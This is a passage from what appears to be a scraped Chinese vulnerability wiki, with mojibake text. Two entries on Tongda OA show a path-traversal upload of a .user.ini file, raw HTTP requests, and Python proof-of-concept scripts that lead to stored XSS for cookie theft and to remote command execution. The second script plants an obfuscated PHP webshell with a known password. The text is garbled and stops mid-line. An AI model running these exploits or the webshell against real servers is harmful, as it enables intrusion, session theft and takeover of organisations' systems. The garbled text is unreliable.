æ–‡ä»¶åŒ…å«æœ‰xssè¯­å¥çš„æ–‡ä»¶ï¼Œä½¿ç®¡ç†å‘˜åå°æ–‡ä»¶å‡åŒ…å«XSSè¯­å¥ï¼Œè¢«æ”»å‡»è€…è·å–æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] é€šè¾¾OA ç¯å¢ƒæ­å»º é€šè¾¾OA v11.6ä¸‹è½½é“¾æ¥ ä¸‹è½½å®Œæ¯•ç‚¹å‡»å®‰è£…å³å¯ æ¼æ´å¤ç° è¿™é‡Œä½¿ç”¨çš„ç¯å¢ƒä¸ºé€šè¾¾ v11.6ç‰ˆæœ¬ï¼Œv11.6ç‰ˆæœ¬ä¸­çš„æ¼æ´åˆ©ç”¨è¾ƒå¥½ï¼Œåœ¨ v11.7 åç»­ç‰ˆæœ¬ä¸­è§„å®šäº†ä¸Šä¼ è·¯å¾„ï¼Œå¯¼è‡´XSSåˆ©ç”¨ä¼šæ¯”è¾ƒå›°éš¾ å‡ºç°æ¼æ´çš„æ–‡ä»¶ä¸º webroot/general/hr/manage/staff_info/update.php \\r\\n\"; echo \"\\r\\n\\r\\n\"; $PHOTO_NAME0 = $_FILES[\"ATTACHMENT\"][\"name\"]; $ATTACHMENT = $_FILES[\"ATTACHMENT\"][\"tmp_name\"]; if ($PHOTO_NAME0 != \"\") { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\"; if (!file_exists($FULL_PATH)) { @mkdir($FULL_PATH, 448); } $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, \".\")); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME; td_copy($ATTACHMENT, $FILENAME); if (file_exists($ATTACHMENT)) { unlink($ATTACHMENT); } if (!file_exists($FILENAME)) { Message(_(\"é™„ä»¶ä¸Šä¼ å¤±è´¥\"), _(\"åŸå› ï¼šé™„ä»¶æ–‡ä»¶ä¸ºç©ºæˆ–æ–‡ä»¶åå¤ªé•¿ï¼Œæˆ–é™„ä»¶å¤§äº30å…†å­—èŠ‚ï¼Œæˆ–æ–‡ä»¶è·¯å¾„ä¸å­˜åœ¨ï¼\")); Button_Back(); exit(); } } åœ¨è¿™é‡Œå‚æ•° $USER_ID æ˜¯å¯æ§çš„ï¼Œå¹¶ä¸”æ— è¿‡æ»¤å±é™©ç¬¦å·å°±æ‹¼æ¥è¿›å»äº†ï¼Œé‚£æˆ‘ä»¬ä¼ å…¥ ../../../ æˆ‘ä»¬å°±å¯ä»¥ä»»æ„æ–‡ä»¶ä¸Šä¼ äº† ç”±äºé€šè¾¾OA çš„æ–‡ä»¶ä¸Šä¼ é™åˆ¶çš„æ­»æ­»çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨ PHPçš„ .user.ini æ–‡ä»¶æ¥åŒ…å«å…¶ä»–æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯å¯ä»¥ç”¨äºåŒ…å«XSSè¯­å¥çš„æ–‡ä»¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ å†…å®¹ä¸º auto_prepend_file=peiqi.log æˆ‘ä»¬æƒ³è¦æœ€å¤§åŒ–åˆ©ç”¨å¯ä»¥ä¸Šä¼ åœ¨é¦–é¡µæˆ–è€…ç®¡ç†å‘˜ ç•Œé¢ï¼Œåˆ©ç”¨è‡ªå®šä¹‰å¼¹çª—æ¥æ¸—é€ è¿™é‡Œå¯¹ç®¡ç†å‘˜é¡µé¢ general ç›®å½•ä¸Šä¼  è¯·æ±‚åŒ…ä¸º POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" æäº¤ -----------------------------17518323986548992951984057104-- å…¶ä¸­ USER_ID=../../general/.user ä¸ºä¸Šä¼ è·¯å¾„ Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log è¿™é‡Œæ‹¼æ¥åä¸Šä¼ å°±å˜æˆäº† .user.ini è¿™é‡Œå†ä¸Šä¼  XSSæ–‡ä»¶ peiqi.log è¢«åŒ…å«è¿›å» ä¸Šä¼ åæ¯æ¬¡ç®¡ç†å‘˜ç™»å½•åéƒ½ä¼šå¸¦ç€Cookieè¯·æ±‚ä¸€æ¬¡XSSå¹³å° é’“é±¼ä»€ä¹ˆçš„ä»£ç å†™åœ¨peiqi.logæ–‡ä»¶é‡Œå°±å¥½å•¦ åˆšåˆšæåˆ°äº† v11.7ç‰ˆæœ¬ä¸æ–¹ä¾¿åˆ©ç”¨ï¼Œè¿™æ˜¯å› ä¸ºåœ¨åç»­ç‰ˆæœ¬åŠ ä¸Šäº†æ–‡ä»¶ä¸Šä¼ çš„è§„å®šè·¯å¾„ if ((strpos($source, \"webroot\") !== false) && (strpos($source, \"attachment\") === false)) { return false; } else { return true; } è·¯å¾„ä¸­å¿…é¡»è¦åŒ…å« webroot å’Œ attachment æ‰å¯ä»¥ä¸Šä¼  è¿™é‡ŒXSSçš„åˆ©ç”¨ç‚¹æœ‰4ä¸ªæ–‡ä»¶å¤¹ï¼Œå…¶ä¸­æœ€æœ‰å‡ ç‡XSSçš„ä¸ºå­˜å‚¨ç›®å½•ç®¡ç†çš„æ–‡ä»¶å¤¹ ç”¨åŒæ ·çš„æ–¹æ³•ä¸Šä¼ åˆ©ç”¨æ–‡ä»¶ï¼Œæ¯æ¬¡å½“ç®¡ç†å‘˜è®¾ç½®æ—¶å°±ä¼šç›—å–Cookie æ¼æ´åˆ©ç”¨POC å› ä¸ºæ˜¯xsså¯èƒ½å¯¹ç›®æ ‡æœ‰å½±å“ï¼Œæ‰€ä»¥è¿™é‡ŒPOCåœ¨ä¸€ä¸ªä¸å¸¸ç”¨ç›®å½•æ¢æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´ Cookieå¡«å†™è®¿é—®åå°æ—¶çš„Cookie, å…¶ä¸­çš„base64è§£ç æ›´æ”¹ PeiQi_Wikiä¸º è‡ªå·±çš„XSSè¯­å¥ v11.6åŠä»¥ä¸‹ æ”»å‡» /general å’Œ /general/system/attachment ç›®å½•è¾ƒå¥½ v11.6ä»¥ä¸Š æ”»å‡» /general/system/attachment ç›®å½•è¾ƒå¥½ import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: é€šè¾¾OA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"æ¡£æ¡ˆå·²ä¿å­˜\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼ .user.iniæ–‡ä»¶, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸Šä¼ .user.iniæ–‡ä»¶å¤±è´¥\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/test \\033[0m\".format(target_url)) if \"æ¡£æ¡ˆå·²ä¿å­˜\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼  test.log æ–‡ä»¶, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸Šä¼  test.log æ–‡ä»¶å¤±è´¥\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test \\033[0m\".format(target_url)) if \"test_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸­åŒ…å« test_Wiki,å­˜åœ¨XSSæ¼æ´, å¯å‚è€ƒæ–‡ç« å†™çš„åˆ©ç”¨ç‰ˆæœ¬è¿›ä¸€æ­¥æ”»å‡» \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸­ä¸åŒ…å« test_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = \"USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31\" POC_1(target_url, Cookie) å‚è€ƒæ–‡ç«  https://paper.seebug.org/1499/ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 16:26:27 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° é€šè¾¾OA v11.8ä»¥ä¸‹å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¥å£ï¼Œå¯ä¸Šä¼  .user.ini æ–‡ä»¶åŒ…å«æœ‰PHPè¯­å¥çš„æ–‡ä»¶å¯¼è‡´å‘½ä»¤æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] é€šè¾¾OA ç¯å¢ƒæ­å»º é€šè¾¾OA v11.6ä¸‹è½½é“¾æ¥ ä¸‹è½½å®Œæ¯•ç‚¹å‡»å®‰è£…å³å¯ æ¼æ´å¤ç° è¿™é‡Œä½¿ç”¨çš„ç¯å¢ƒä¸ºé€šè¾¾ v11.6ç‰ˆæœ¬ å‡ºç°æ¼æ´çš„æ–‡ä»¶ä¸º webroot/general/hr/manage/staff_info/update.php \\r\\n\"; echo \"\\r\\n\\r\\n\"; $PHOTO_NAME0 = $_FILES[\"ATTACHMENT\"][\"name\"]; $ATTACHMENT = $_FILES[\"ATTACHMENT\"][\"tmp_name\"]; if ($PHOTO_NAME0 != \"\") { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\"; if (!file_exists($FULL_PATH)) { @mkdir($FULL_PATH, 448); } $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, \".\")); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME; td_copy($ATTACHMENT, $FILENAME); if (file_exists($ATTACHMENT)) { unlink($ATTACHMENT); } if (!file_exists($FILENAME)) { Message(_(\"é™„ä»¶ä¸Šä¼ å¤±è´¥\"), _(\"åŸå› ï¼šé™„ä»¶æ–‡ä»¶ä¸ºç©ºæˆ–æ–‡ä»¶åå¤ªé•¿ï¼Œæˆ–é™„ä»¶å¤§äº30å…†å­—èŠ‚ï¼Œæˆ–æ–‡ä»¶è·¯å¾„ä¸å­˜åœ¨ï¼\")); Button_Back(); exit(); } } åœ¨è¿™é‡Œå‚æ•° $USER_ID æ˜¯å¯æ§çš„ï¼Œå¹¶ä¸”æ— è¿‡æ»¤å±é™©ç¬¦å·å°±æ‹¼æ¥è¿›å»äº†ï¼Œé‚£æˆ‘ä»¬ä¼ å…¥ ../../../ æˆ‘ä»¬å°±å¯ä»¥ä»»æ„æ–‡ä»¶ä¸Šä¼ äº† ç”±äºé€šè¾¾OA çš„æ–‡ä»¶ä¸Šä¼ é™åˆ¶çš„æ­»æ­»çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨ PHPçš„ .user.ini æ–‡ä»¶æ¥åŒ…å«å…¶ä»–æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯å¯ä»¥ç”¨äºåŒ…å«PHPè¯­å¥çš„æ–‡ä»¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶å†…å®¹ä¸º auto_prepend_file=peiqi.log è¯·æ±‚åŒ…ä¸º POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" æäº¤ -----------------------------17518323986548992951984057104-- å…¶ä¸­ USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user ä¸ºä¸Šä¼ è·¯å¾„ å…³äºæ›´å¤šåŸç†å‚è€ƒ http://wiki.peiqi.tech ä¸­çš„å¦ä¸€ç¯‡ é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«å­˜å‚¨å‹XSSæ¼æ´ è¿™é‡Œæˆ‘ä»¬ç®€å•çŸ¥é“äº†ä¸Šä¼ æ–¹å¼ï¼Œé‚£æˆ‘ä»¬å°±é€šè¿‡ .user.iniæ–‡ä»¶ åŒ…å«æ¶æ„æ–‡ä»¶ ç°åœ¨å·²ç»æˆåŠŸä¸Šä¼ äº†æ¶æ„æ–‡ä»¶ è®¿é—® http://xxx.xxx.xxx.xxx/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=ipconfig æ–‡ä»¶åŒ…å«å‘½ä»¤æ‰§è¡Œ [!NOTE] åœ¨ v11.6ä¸­ ä¸Šä¼ çš„ä½ç½®å¹¶æ²¡æœ‰é™å®šæ‰€ä»¥å¯ä»¥ä¸Šä¼ åœ¨æ–¹ä¾¿è®¿é—®çš„ç›®å½•(ä¸éœ€è¦ç™»å½•) è€Œ v11.8ä¸­åˆ™æœ‰ç›®å½•åçš„é™åˆ¶éœ€è¦ç›®å½•å¸¦æœ‰ webroot å’Œ attachment æ¼æ´åˆ©ç”¨POC [!NOTE] è„šæœ¬åœ¨ v11.6 æµ‹è¯•æˆåŠŸæ‰§è¡Œï¼Œ åœ¨ v11.6ä»¥ä¸Šæ‰§è¡Œæ—¶ è¿™ä¸ªwebshellæ— æ³•æ‰§è¡Œå‘½ä»¤ v11.7 v11.8å¯ç”¨èšå‰‘æ’ä»¶ç»•è¿‡è¿æ¥webshell import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: é€šè¾¾OA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5pbmkiCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKYXV0b19wcmVwZW5kX2ZpbGU9dGVzdC5sb2cKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"æ¡£æ¡ˆå·²ä¿å­˜\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼ .user.iniæ–‡ä»¶, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸Šä¼ .user.iniæ–‡ä»¶å¤±è´¥\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5sb2ciCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKPD9waHAgCmVjaG8gInRlc3RfV2lraSI7CiRwemtCPWNyZWF0ZV9mdW5jdGlvbihjaHIoMDEwMTc1MC8wMTY1MikuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoOTkwODEvOTA5KS5jaHIoMDEwMjUtMDY2MCksY2hyKDA1MTctMDM1MikuY2hyKDB4MzQzLTB4MmNkKS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuYmFzZTY0X2RlY29kZSgnS0E9PScpLmJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoNDQ0LTMyOSkuYmFzZTY0X2RlY29kZSgnYnc9PScpLmNocig1OTctNDg4KS5jaHIoMHgxOWYtMHgxM2EpLmNocigyMTktMTc4KS5iYXNlNjRfZGVjb2RlKCdPdz09JykpOyRwemtCKGJhc2U2NF9kZWNvZGUoJ05EZzFOJy4nemMyTzAnLidCbGRrRicuJ3NLQ1JmJy4nJy5jaHIoODIxMTAvOTY2KS5iYXNlNjRfZGVjb2RlKCdSUT09Jykuc3RyX3JvdDEzKCc5JykuY2hyKDAxNTUwNjQvMDEyMzEpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5zdHJfcm90MTMoJ1MnKS5iYXNlNjRfZGVjb2RlKCdkQT09JykuYmFzZTY0X2RlY29kZSgnTUE9PScpLmNocig2MDc1MC82NzUpLmNocigwMTUwNy0wMTM1NykuJycuJ04wWFNrJy4nN01UUTEnLidOek15TycuJ0RzPScuJycpKTs/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQo=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/test \\033[0m\".format(target_url)) if \"æ¡£æ¡ˆå·²ä¿å­˜\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼  test.log æ–‡ä»¶, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸Šä¼  test.log æ–‡ä»¶å¤±è´¥\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033[0m\".format(target_url)) if \"test_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸­åŒ…å« test_Wiki \\033[0m\".format(target_url)) print(\"\\033[32m[o] æˆåŠŸä¸Šä¼ èšå‰‘æœ¨é©¬ å¯†ç ä¸º: test \\n[o] webshellè·¯å¾„: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸­ä¸åŒ…å« test_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = 